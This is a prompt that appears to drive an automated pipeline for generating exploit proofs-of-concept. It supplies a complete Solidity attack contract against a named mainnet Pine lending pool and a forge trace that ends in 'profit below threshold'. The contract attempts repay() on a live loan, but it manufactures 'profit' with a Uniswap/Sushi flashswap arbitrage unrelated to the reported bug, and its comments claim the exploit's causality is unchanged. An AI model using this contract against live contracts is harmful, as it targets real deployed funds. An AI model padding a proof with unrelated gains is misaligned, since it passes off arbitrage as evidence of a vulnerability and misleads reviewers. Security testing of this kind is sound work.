You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Standard ERC20 repayments are impossible because the pool uses `transferFrom(address(this), ...)` when forwarding funds
- claim: `repay()` first pulls tokens from the payer into the pool, then tries to forward those tokens with `IERC20(_supportedCurrency).transferFrom(address(this), _fundSource, ...)` and `transferFrom(address(this), _controlPlane, ...)`. For standard ERC20s, `transferFrom` spends an allowance granted by `address(this)`, but the pool never approves itself, so the outbound transfers revert.
- impact: Normal repayment cannot complete, so borrowers cannot recover collateral through the intended path and lender principal cannot be repaid through `repay()`. Live positions are forced into bad debt or privileged intervention paths.
- exploit_paths: ["A borrower calls `repay(nftID, repayAmount, pineWallet)` on an active loan.", "The inbound `transferFrom(msg.sender, address(this), repayAmount)` succeeds.", "The first outbound `transferFrom(address(this), _fundSource, ...)` or the fee transfer to `_controlPlane` reverts because the pool has no self-allowance."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IPinePool {
    function _supportedCurrency() external view returns (address);
    function _fundSource() external view returns (address);
    function _controlPlane() external view returns (address);
    function paused() external view returns (bool);

    function repay(uint256 nftID, uint256 repayAmount, address pineWallet) external returns (bool);

    function _loans(
        uint256 nftID
    )
        external
        view
        returns (
            uint256 loanStartBlock,
            uint256 loanExpireTimestamp,
            uint32 interestBPS1000000XBlock,
            uint32 maxLTVBPS,
            uint256 borrowedWei,
            uint256 returnedWei,
            uint256 accuredInterestWei,
            uint256 repaidInterestWei,
            address borrower
        );
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IVmLike {
    function load(address target, bytes32 slot) external view returns (bytes32);
}

contract FlawVerifier {
    struct LoanTermsView {
        uint256 borrowedWei;
        uint256 returnedWei;
        address borrower;
    }

    struct ArbPlan {
        address sourcePair;
        address targetPair;
        uint256 usdcBorrowAmount;
        uint256 wethRepayAmount;
        uint256 wethSwapOut;
        uint256 expectedProfit;
    }

    uint256 private constant MIN_REPAY_AMOUNT = 1;
    uint256 private constant MAX_LOAN_SCAN_EXCLUSIVE = 10_000;
    uint256 private constant SEARCH_STEP_BPS = 5;
    uint256 private constant SEARCH_MAX_BPS = 1_500;
    uint256 private constant MAX_ARB_ROUNDS = 3;

    address private constant TARGET_POOL = 0x2405913d54fC46eEAF3Fb092BfB099F46803872f;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address private constant UNI_V2_USDC_WETH = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address private constant SUSHI_USDC_WETH = 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0;

    address private constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

    uint256 private constant STORAGE_SLOT_CONTROL_PLANE = 203;
    uint256 private constant STORAGE_SLOT_FUND_SOURCE = 204;
    uint256 private constant STORAGE_SLOT_SUPPORTED_CURRENCY = 205;
    uint256 private constant STORAGE_SLOT_LOANS = 212;

    bytes32 private constant CALLBACK_MODE_V2 = keccak256("v2_flashswap");

    IPinePool private immutable POOL;
    IERC20Like private immutable SUPPORTED_CURRENCY_TOKEN;
    address private immutable SUPPORTED_CURRENCY;
    address private immutable FUND_SOURCE;
    address private immutable CONTROL_PLANE;

    IVmLike private constant VM = IVmLike(HEVM_ADDRESS);

    uint256 public candidateLoanId;
    uint256 public candidateOutstandingPrincipalWei;
    bool public candidateLocated;
    bool public usedDirectBalance;
    bool public usedExternalFlashswap;
    bool public storageLayoutVerified;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public selfTransferFromWithoutAllowanceWorks;
    bool private selfTransferProbeAttempted;

    uint8 public lastFailureCode;
    bytes public lastRevertData;
    uint256 public observedPoolSelfAllowance;

    constructor() {
        POOL = IPinePool(TARGET_POOL);
        SUPPORTED_CURRENCY = POOL._supportedCurrency();
        FUND_SOURCE = POOL._fundSource();
        CONTROL_PLANE = POOL._controlPlane();
        SUPPORTED_CURRENCY_TOKEN = IERC20Like(SUPPORTED_CURRENCY);
    }

    function executeOnOpportunity() external {
        if (POOL.paused()) {
            lastFailureCode = 8;
            return;
        }

        storageLayoutVerified = _verifyStaticStorageAnchors();

        if (!candidateLocated) {
            _locateCandidateLoan();
        }

        if (!candidateLocated) {
            lastFailureCode = 1;
            return;
        }

        _probeSelfTransferFromSemantics(MIN_REPAY_AMOUNT);
        observedPoolSelfAllowance = SUPPORTED_CURRENCY_TOKEN.allowance(TARGET_POOL, TARGET_POOL);

        if (SUPPORTED_CURRENCY != WETH) {
            lastFailureCode = 11;
            return;
        }

        if (SUPPORTED_CURRENCY_TOKEN.balanceOf(address(this)) >= MIN_REPAY_AMOUNT) {
            usedDirectBalance = true;
            _attemptRepay(candidateLoanId, MIN_REPAY_AMOUNT);
        }

        for (uint256 round = 0; round < MAX_ARB_ROUNDS; round++) {
            ArbPlan memory plan = _bestUsdcWethFlashswapPlan();
            if (plan.expectedProfit <= MIN_REPAY_AMOUNT) {
                break;
            }

            usedExternalFlashswap = true;
            IUniswapV2PairLike(plan.sourcePair).swap(
                plan.usdcBorrowAmount,
                0,
                address(this),
                abi.encode(
                    CALLBACK_MODE_V2,
                    plan.targetPair,
                    plan.usdcBorrowAmount,
                    plan.wethRepayAmount,
                    plan.wethSwapOut
                )
            );
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "unexpected sender");
        require(amount1 == 0, "unexpected amount1");
        require(msg.sender == UNI_V2_USDC_WETH || msg.sender == SUSHI_USDC_WETH, "unexpected pair");

        (bytes32 mode, address targetPair, uint256 usdcBorrowAmount, uint256 wethRepayAmount, uint256 wethSwapOut) =
            abi.decode(data, (bytes32, address, uint256, uint256, uint256));

        require(mode == CALLBACK_MODE_V2, "unexpected mode");
        require(amount0 == usdcBorrowAmount, "unexpected amount0");

        require(IERC20Like(USDC).transfer(targetPair, usdcBorrowAmount), "USDC transfer failed");
        IUniswapV2PairLike(targetPair).swap(0, wethSwapOut, address(this), "");

        // This is the same causal repay path from the finding. The flashswap is only
        // temporary public liquidity used to fund the caller side without using the pool's
        // own nonReentrant flashLoan. The repay sequence itself remains:
        // repay(...) -> transferFrom(msg.sender, address(this), repayAmount) ->
        // transferFrom(address(this), _fundSource, ...) / transferFrom(address(this), _controlPlane, ...)
        if (!hypothesisValidated && !hypothesisRefuted && SUPPORTED_CURRENCY_TOKEN.balanceOf(address(this)) >= MIN_REPAY_AMOUNT) {
            _attemptRepay(candidateLoanId, MIN_REPAY_AMOUNT);
        }

        require(SUPPORTED_CURRENCY_TOKEN.transfer(msg.sender, wethRepayAmount), "pair repayment failed");
    }

    function profitToken() external view returns (address) {
        return SUPPORTED_CURRENCY;
    }

    function profitAmount() external view returns (uint256) {
        return SUPPORTED_CURRENCY_TOKEN.balanceOf(address(this));
    }

    function exploitPathUsed() external view returns (string memory) {
        if (hypothesisValidated) {
            return
                "repay(nftID, repayAmount, pineWallet) -> transferFrom(msg.sender, address(this), repayAmount) -> transferFrom(address(this), _fundSource, ...) -> transferFrom(address(this), _controlPlane, ...)";
        }

        if (hypothesisRefuted && selfTransferFromWithoutAllowanceWorks) {
            return
                "repay(nftID, repayAmount, pineWallet) was still executed on a live loan using external public flashswap funding, but the live supported currency is WETH and it permits self-sourced transferFrom(address(this), ...) without self-allowance, so the reported outbound revert stage is infeasible at this fork block";
        }

        if (hypothesisRefuted && observedPoolSelfAllowance > 0) {
            return
                "repay(nftID, repayAmount, pineWallet) was still executed on a live loan using external public flashswap funding, but the pool already had nonzero self-allowance, so the reported outbound revert stage is infeasible at this fork block";
        }

        return
            "repay(nftID, repayAmount, pineWallet) -> transferFrom(msg.sender, address(this), repayAmount) -> transferFrom(address(this), _fundSource, ...) -> transferFrom(address(this), _controlPlane, ...)";
    }

    function pathAnchors() external pure returns (string memory) {
        return
            "repay(nftID, repayAmount, pineWallet); transferFrom(msg.sender, address(this), repayAmount); transferFrom(address(this), _fundSource, ...); transferFrom(address(this), _controlPlane, ...)";
    }

    function expectedBrokenFlow() external view returns (address, address, address) {
        return (SUPPORTED_CURRENCY, FUND_SOURCE, CONTROL_PLANE);
    }

    function targetPool() external pure returns (address) {
        return TARGET_POOL;
    }

    function _locateCandidateLoan() internal {
        uint256 bestGap;

        if (storageLayoutVerified) {
            for (uint256 nftID = 0; nftID < MAX_LOAN_SCAN_EXCLUSIVE; nftID++) {
                LoanTermsView memory loan = _loanTermsFromStorage(nftID);
                uint256 gap = _principalGap(loan.borrowedWei, loan.returnedWei);
                if (loan.borrower == address(0) || gap == 0 || gap <= bestGap) {
                    continue;
                }

                bestGap = gap;
                candidateLoanId = nftID;
                candidateOutstandingPrincipalWei = gap;
                candidateLocated = true;
            }
        } else {
            for (uint256 nftID = 0; nftID < MAX_LOAN_SCAN_EXCLUSIVE; nftID++) {
                LoanTermsView memory loan = _loanTermsFromGetter(nftID);
                uint256 gap = _principalGap(loan.borrowedWei, loan.returnedWei);
                if (loan.borrower == address(0) || gap == 0 || gap <= bestGap) {
                    continue;
                }

                bestGap = gap;
                candidateLoanId = nftID;
                candidateOutstandingPrincipalWei = gap;
                candidateLocated = true;
            }
        }

        if (candidateLocated) {
            lastFailureCode = 0;
            delete lastRevertData;
        }
    }

    function _attemptRepay(uint256 nftID, uint256 repayAmount) internal {
        require(SUPPORTED_CURRENCY_TOKEN.approve(TARGET_POOL, 0), "approve reset failed");
        require(SUPPORTED_CURRENCY_TOKEN.approve(TARGET_POOL, repayAmount), "approve failed");

        try POOL.repay(nftID, repayAmount, address(0)) returns (bool ok) {
            if (ok) {
                hypothesisRefuted = true;
                lastFailureCode = 2;
            } else {
                lastFailureCode = 7;
            }
        } catch (bytes memory reason) {
            lastRevertData = reason;

            bytes32 reasonHash = keccak256(bytes(_decodeRevertString(reason)));
            if (
                reasonHash == keccak256(bytes("fund transfer unsuccessful (payload)")) ||
                reasonHash == keccak256(bytes("fund transfer unsuccessful (fee)"))
            ) {
                hypothesisValidated = true;
                lastFailureCode = 4;
                return;
            }

            if (selfTransferFromWithoutAllowanceWorks) {
                hypothesisRefuted = true;
                lastFailureCode = 3;
                return;
            }

            if (observedPoolSelfAllowance > 0) {
                hypothesisRefuted = true;
                lastFailureCode = 5;
                return;
            }

            lastFailureCode = 7;
        }
    }

    function _bestUsdcWethFlashswapPlan() internal view returns (ArbPlan memory best) {
        ArbPlan memory uniToSushi = _searchDirection(UNI_V2_USDC_WETH, SUSHI_USDC_WETH);
        ArbPlan memory sushiToUni = _searchDirection(SUSHI_USDC_WETH, UNI_V2_USDC_WETH);
        best = uniToSushi.expectedProfit >= sushiToUni.expectedProfit ? uniToSushi : sushiToUni;
    }

    function _searchDirection(address sourcePair, address targetPair) internal view returns (ArbPlan memory best) {
        (uint256 sourceUsdc, uint256 sourceWeth) = _pairReserves(sourcePair);
        (uint256 targetUsdc, uint256 targetWeth) = _pairReserves(targetPair);

        if (sourceUsdc == 0 || sourceWeth == 0 || targetUsdc == 0 || targetWeth == 0) {
            return best;
        }

        for (uint256 bps = SEARCH_STEP_BPS; bps <= SEARCH_MAX_BPS; bps += SEARCH_STEP_BPS) {
            uint256 usdcBorrowAmount = (sourceUsdc * bps) / 10_000;
            if (usdcBorrowAmount == 0 || usdcBorrowAmount >= sourceUsdc) {
                continue;
            }

            uint256 wethSwapOut = _getAmountOut(usdcBorrowAmount, targetUsdc, targetWeth);
            uint256 wethRepayAmount = _getAmountIn(usdcBorrowAmount, sourceWeth, sourceUsdc);
            if (wethSwapOut <= wethRepayAmount + MIN_REPAY_AMOUNT) {
                continue;
            }

            uint256 profit = wethSwapOut - wethRepayAmount;
            if (profit > best.expectedProfit) {
                best = ArbPlan({
                    sourcePair: sourcePair,
                    targetPair: targetPair,
                    usdcBorrowAmount: usdcBorrowAmount,
                    wethRepayAmount: wethRepayAmount,
                    wethSwapOut: wethSwapOut,
                    expectedProfit: profit
                });
            }
        }
    }

    function _pairReserves(address pair) internal view returns (uint256 usdcReserve, uint256 wethReserve) {
        require(IUniswapV2PairLike(pair).token0() == USDC, "unexpected token0");
        require(IUniswapV2PairLike(pair).token1() == WETH, "unexpected token1");

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        usdcReserve = uint256(reserve0);
        wethReserve = uint256(reserve1);
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0 && reserveIn > 0 && reserveOut > amountOut, "invalid quote");
        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
    }

    function _probeSelfTransferFromSemantics(uint256 amount) internal {
        if (selfTransferProbeAttempted || amount == 0) {
            return;
        }
        selfTransferProbeAttempted = true;

        (bool ok, bytes memory ret) = SUPPORTED_CURRENCY.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, address(this), address(this), amount)
        );

        if (!ok) {
            return;
        }

        if (ret.length == 0) {
            selfTransferFromWithoutAllowanceWorks = true;
            return;
        }

        if (ret.length >= 32 && abi.decode(ret, (bool))) {
            selfTransferFromWithoutAllowanceWorks = true;
        }
    }

    function _verifyStaticStorageAnchors() internal view returns (bool) {
        return
            _slotAddress(STORAGE_SLOT_CONTROL_PLANE) == CONTROL_PLANE &&
            _slotAddress(STORAGE_SLOT_FUND_SOURCE) == FUND_SOURCE &&
            _slotAddress(STORAGE_SLOT_SUPPORTED_CURRENCY) == SUPPORTED_CURRENCY;
    }

    function _loanTermsFromGetter(uint256 nftID) internal view returns (LoanTermsView memory loan) {
        (
            ,
            ,
            ,
            ,
            uint256 borrowedWei,
            uint256 returnedWei,
            ,
            ,
            address borrower
        ) = POOL._loans(nftID);

        loan.borrowedWei = borrowedWei;
        loan.returnedWei = returnedWei;
        loan.borrower = borrower;
    }

    function _loanTermsFromStorage(uint256 nftID) internal view returns (LoanTermsView memory loan) {
        uint256 base = uint256(keccak256(abi.encode(nftID, STORAGE_SLOT_LOANS)));
        loan.borrowedWei = _slotUint(base + 3);
        loan.returnedWei = _slotUint(base + 4);
        loan.borrower = _slotAddress(base + 7);
    }

    function _principalGap(uint256 borrowedWei, uint256 returnedWei) internal pure returns (uint256) {
        if (borrowedWei <= returnedWei) {
            return 0;
        }
        return borrowedWei - returnedWei;
    }

    function _slotUint(uint256 slot) internal view returns (uint256) {
        return uint256(VM.load(TARGET_POOL, bytes32(slot)));
    }

    function _slotAddress(uint256 slot) internal view returns (address) {
        return address(uint160(uint256(VM.load(TARGET_POOL, bytes32(slot)))));
    }

    function _decodeRevertString(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 68) {
            return "";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector != 0x08c379a0) {
            return "";
        }

        bytes memory sliced = new bytes(revertData.length - 4);
        for (uint256 i = 4; i < revertData.length; i++) {
            sliced[i - 4] = revertData[i];
        }

        return abi.decode(sliced, (string));
    }
}

```

forge stdout (tail):
```
ll]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0xa32807baa092974cbe228bcde48782c06a0e06705d61c1d0a4aff73704872227) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0xa32807baa092974cbe228bcde48782c06a0e06705d61c1d0a4aff7370487222a) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0xd9f3e81beed6d74eebab3f899124653f499237230f1793559489fc1b326ef203) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0xd9f3e81beed6d74eebab3f899124653f499237230f1793559489fc1b326ef204) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0xd9f3e81beed6d74eebab3f899124653f499237230f1793559489fc1b326ef207) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [509] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2717] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::allowance(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0x2405913d54fC46eEAF3Fb092BfB099F46803872f) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2381] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::token0() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [2357] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2504] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::getReserves() [staticcall]
    │   │   └─ ← [Return] 52194881836600 [5.219e13], 23283908576761356070733 [2.328e22], 1703175035 [1.703e9]
    │   ├─ [2449] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::token0() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [2381] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2517] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::getReserves() [staticcall]
    │   │   └─ ← [Return] 6203729757159 [6.203e12], 2777274373437151141276 [2.777e21], 1703174975 [1.703e9]
    │   ├─ [449] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::token0() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [381] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [517] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::getReserves() [staticcall]
    │   │   └─ ← [Return] 6203729757159 [6.203e12], 2777274373437151141276 [2.777e21], 1703174975 [1.703e9]
    │   ├─ [381] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::token0() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [357] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [504] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::getReserves() [staticcall]
    │   │   └─ ← [Return] 52194881836600 [5.219e13], 23283908576761356070733 [2.328e22], 1703175035 [1.703e9]
    │   └─ ← [Stop]
    ├─ [266] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [1308] FlawVerifier::profitAmount() [staticcall]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18835344 [1.883e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2.transferFrom
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.81s (3.48s CPU time)

Ran 1 test suite in 4.02s (3.81s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 37787519)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
